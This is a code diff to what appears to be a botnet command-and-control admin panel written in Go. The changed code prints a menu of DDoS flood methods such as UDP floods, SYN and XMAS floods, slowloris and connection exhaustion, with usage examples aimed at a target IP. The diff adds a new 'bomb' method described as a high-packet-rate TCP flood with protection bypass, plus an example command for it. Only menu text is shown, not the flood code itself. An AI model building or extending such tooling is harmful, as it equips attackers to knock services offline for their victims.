@@ -177,13 +177,15 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("│ udp, raw, nudp, udphex, cudp, slowudp, frag                  │\r\n"))
 			this.conn.Write([]byte("├────── l4 tcp ────────────────────────────────────────────────┤\r\n"))
 			this.conn.Write([]byte("│ tcp, ack, syn, xmas, bypass, handshake, std, hex, stdhex     │\r\n"))
-			this.conn.Write([]byte("│ slowloris, rsmedia, ovhtcp, tcp_handshake, conn_exhaust      │\r\n"))
+			this.conn.Write([]byte("│ slowloris, rsmedia, ovhtcp, tcp_handshake, conn_exhaust       │\r\n"))
+			this.conn.Write([]byte("│ bomb - high PPS tcp flood with advanced bypass               │\r\n"))
 			this.conn.Write([]byte("├────── special ───────────────────────────────────────────────┤\r\n"))
 			this.conn.Write([]byte("│ socket - powerful legitimate tcp (full handshake + clean)    │\r\n"))
 			this.conn.Write([]byte("├────── how to use ────────────────────────────────────────────┤\r\n"))
 			this.conn.Write([]byte("│ ex: nudp 1.2.3.4 120 port=666                                │\r\n"))
 			this.conn.Write([]byte("│ ex: slowloris 1.2.3.4 300 port=80                            │\r\n"))
 			this.conn.Write([]byte("│ ex: socket 1.2.3.4 120 port=80 threads=64 size=1024          │\r\n"))
+			this.conn.Write([]byte("│ ex: bomb 1.2.3.4 300 port=80 threads=128                     │\r\n"))
 			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
 			continue
 		}
